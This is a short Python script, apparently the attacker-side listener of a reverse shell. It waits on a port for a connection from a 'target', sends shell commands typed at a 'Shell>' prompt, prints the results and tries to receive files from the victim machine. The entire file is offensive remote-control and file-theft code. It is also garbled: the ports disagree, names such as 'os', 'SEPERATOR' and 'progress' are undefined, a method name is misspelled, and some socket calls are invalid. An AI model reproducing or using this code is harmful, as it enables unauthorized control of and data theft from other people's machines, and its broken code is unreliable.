import socket # For Building TCP Connection

buffer = 4096

def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's'

    s.bind(("0.0.0.0", 5003)) # define the kali IP and the listening port

    s.listen(1) # define the backlog size, since we are expecting a single connection from a single
                                                            # target we will listen to one connection

    print ('[+] Listening for incoming TCP connection on port 8080')

    conn, addr = s.accept() # accept() function will return the connection object ID (conn) and will return the client(target) IP address and source
                                # port in a tuple format (IP,port)

    print ('[+] We got a connection from: ', addr)


    while True:

        command = input("Shell> ") # Get user input and store it in command variable

        if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop
            conn.send('terminate')
            conn.close()
            break

        else:
            conn.send(command) # Otherwise we will send the command to the target
            print (conn.recv(1024)) # and print the result that we got back

        receive_file = s.socket.recv(buffer)
        filename, filesize = receive_file.split(SEPERATOR)

        filename = os.path.basename(filename)
        filesize = int(filesize)

        with open(filename, "wb") as f:
            for _ in progress:
                bytes_read = s.recv(buffer)
                if not bytes_read:
                    break
                f.wrtie(bytes_read)

    f.close()
    
def main ():
    connect()
main()
